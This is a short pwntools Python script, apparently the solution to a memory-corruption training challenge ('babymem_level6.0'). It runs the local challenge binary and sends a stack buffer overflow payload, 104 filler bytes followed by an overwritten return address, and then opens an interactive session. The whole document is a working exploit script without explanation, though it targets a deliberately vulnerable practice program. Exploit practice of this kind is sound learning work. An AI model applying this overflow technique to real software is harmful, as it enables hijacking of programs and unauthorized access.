from pwn import *

p = process('/challenge/babymem_level6.0')

p.recvuntil('Payload size:')
p.sendline(b'112')

payload = b'a' * 104 + p64(0x401fb9) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

